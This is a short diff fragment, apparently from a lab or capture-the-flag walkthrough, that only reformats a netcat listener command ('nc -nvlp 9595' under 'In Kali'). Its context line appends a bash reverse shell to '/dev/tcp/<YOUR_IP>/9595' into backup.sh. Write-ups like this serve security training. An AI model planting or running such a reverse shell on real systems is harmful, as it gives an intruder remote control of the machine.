@@ -8,7 +8,7 @@ echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/9595 0>&1'" >> backup.sh
 ```
 
 ### In Kali
-nc -nvlp 9595
+``nc -nvlp 9595``
 
 ## Recon
 ```bash
